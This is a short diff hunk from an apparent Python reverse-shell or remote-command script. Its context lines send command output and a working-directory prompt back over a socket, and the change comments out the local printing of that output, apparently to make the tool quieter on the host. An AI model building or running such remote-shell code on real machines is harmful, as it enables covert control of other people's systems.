@@ -28,4 +28,4 @@ while True:
         currentWD = os.getcwd() + '> '
         s.send((output_str + currentWD).encode())
         
-        print(output_str)
+        # print(output_str)
